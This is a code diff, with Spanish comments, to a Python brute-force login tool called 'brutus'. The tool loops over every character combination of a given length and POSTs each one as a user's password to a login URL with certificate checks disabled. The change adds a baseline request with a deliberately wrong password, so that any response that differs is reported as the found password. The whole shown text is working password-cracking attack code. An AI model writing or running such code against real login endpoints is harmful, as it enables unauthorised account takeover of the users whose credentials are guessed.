@@ -20,13 +20,16 @@ def brutus(url, cabecera, usuario, longitud ):
 #este es un array que contiene todas las combinaciones de contraseñas generadas para probar en la conexion
 	combinaciones = itertools.product(arreglodecaracteres , repeat=longitud)
 	#por cada combinacion se realiza una conexion donde password es igual a la combinacion
-	
+	password = 'passincoretablalblalanoseasfisconelcreadordebrutuseskender'
+	payload = {'user': usuario , 'pass': password} 
+	rr = requests.post(url, data=json.dumps(payload),headers=cabecera, verify=False)
+	control = rr.text
 	for combinacion in combinaciones:
 		password = ''.join(combinacion)
 		payload = {'user': usuario , 'pass': password} 
 		r = requests.post(url, data=json.dumps(payload),headers=cabecera, verify=False)
 		respuesta = r.text
-		if 'incorrecta' in respuesta:
+		if  respuesta == control:
 		    print('contraseña incorrecta: '+password)
 		else:
 		    print('---------------------CONTRASEÑA ENCONTRADA-----------------------')
